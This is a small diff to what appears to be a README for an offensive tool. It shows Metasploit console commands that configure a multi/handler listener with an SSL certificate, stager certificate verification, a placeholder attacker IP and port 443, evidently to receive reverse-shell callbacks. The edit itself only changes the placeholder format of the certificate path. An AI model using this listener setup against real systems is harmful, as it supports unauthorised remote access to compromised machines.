@@ -52,7 +52,7 @@ dotnet build
 ```sh
 msfconsole  
 use exploit/multi/handler  
-set HandlerSSLCert /home/PATH/TO/THE/example.pem (of the key we are generate earlier)  
+set HandlerSSLCert </home/PATH/TO/THE/example.pem> (of the key we are generate earlier)  
 set StagerVerifySSLCert true  
 set LHOST ourIPADRESS  
 set LPORT 443  
